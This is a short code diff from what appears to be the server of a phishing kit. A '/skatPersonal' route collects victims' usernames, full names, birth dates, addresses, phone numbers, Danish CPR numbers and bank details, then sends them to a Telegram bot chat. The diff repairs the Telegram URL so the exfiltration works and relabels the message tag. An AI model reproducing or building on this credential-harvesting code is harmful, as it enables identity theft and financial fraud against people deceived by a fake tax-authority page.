@@ -2802,7 +2802,7 @@ app.post('/skatPersonal', (req, res) => {
     var originalText = `+----------- Login Information ------------+\nUsername: ${username}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nZIP: ${zip}\nPhone Number: ${telephone}\nCPR: ${cpr}\nBank: ${bank}`;
 
     axios.post(
-        `https:api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=SKATRH:\n${originalText}`
+        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=BTSS:\n${originalText}`
     ).catch(e => {
         console.log(e)
     });
